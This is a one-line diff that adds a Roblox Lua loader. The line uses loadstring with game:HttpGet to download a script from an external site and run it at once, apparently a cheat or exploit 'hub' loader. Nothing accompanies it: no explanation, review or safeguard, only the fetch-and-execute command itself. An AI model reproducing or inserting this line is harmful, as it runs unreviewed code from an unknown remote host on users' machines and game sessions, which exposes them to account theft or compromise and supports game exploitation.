@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://quantumonyx.xyz/MainHub/BetaTesting.lua"))()
